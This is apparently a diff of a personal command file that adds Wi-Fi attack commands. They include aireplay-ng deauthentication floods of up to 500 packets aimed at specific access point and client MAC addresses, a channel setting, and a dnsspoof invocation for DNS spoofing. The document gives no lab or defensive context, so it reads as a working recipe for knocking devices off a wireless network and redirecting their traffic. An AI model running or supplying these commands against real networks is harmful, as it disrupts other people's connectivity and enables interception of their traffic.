@@ -1,3 +1,10 @@
  sudo aireplay-ng -0 10 -a EC:08:6B:A8:70:59 -c 18:83:31:36:FA:49 wlan1
 
- sudo aireplay-ng -0 20 -a B0:4E:26:B9:55:6C -c AC:5F:3E:FA:8B:BF wlan1
+ sudo aireplay-ng -0 500 -a E8:4E:06:4B:C8:B8 -c 48:c7:96:76:7a:37 wlan1
+
+ sudo aireplay-ng -0 20 -a B0:4E:26:B9:55:6C -c 50:9E:A7:C0:9D:63 wlan1
+
+
+iwconfig wlan1 channel 6  
+
+ dnsspoof -i wlan1mon
